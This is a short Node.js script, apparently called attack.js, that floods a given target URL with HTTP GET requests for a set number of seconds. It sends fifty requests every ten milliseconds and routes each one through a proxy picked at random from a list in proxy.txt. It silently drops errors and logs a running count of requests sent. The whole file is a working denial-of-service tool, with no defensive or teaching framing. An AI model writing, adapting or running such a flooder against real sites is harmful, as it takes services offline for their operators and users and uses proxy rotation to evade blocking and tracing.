const fs = require('fs');
const http = require('http');
const url = require('url');

if (process.argv.length < 4) {
    console.log("Usage: node attack.js <target> <time>");
    process.exit(1);
}

const target = process.argv[2];
const duration = parseInt(process.argv[3]) * 1000;
const proxies = fs.readFileSync('proxy.txt', 'utf-8').split('\n').filter(Boolean);

let sent = 0;
const endTime = Date.now() + duration;

function flood() {
    const { hostname, path } = url.parse(target);
    const proxy = proxies[Math.floor(Math.random() * proxies.length)];
    const [proxyHost, proxyPort] = proxy.split(':');

    const options = {
        host: proxyHost,
        port: parseInt(proxyPort),
        method: 'GET',
        path: target, // full URL because it's via proxy
        headers: {
            Host: hostname,
            'User-Agent': 'Mozilla/5.0 (compatible; Bot/1.0)',
            Connection: 'close'
        }
    };

    const req = http.request(options);
    req.on('error', () => {}); // don't log failed
    req.end();

    sent++;
    console.log(`(${sent}) Sent to ${target}`);
}

function startFlood() {
    const interval = setInterval(() => {
        if (Date.now() >= endTime) {
            clearInterval(interval);
            console.log(`Finished flooding ${target} | Total Sent: ${sent}`);
        } else {
            for (let i = 0; i < 50; i++) {
                flood();
            }
        }
    }, 10);
}

startFlood();
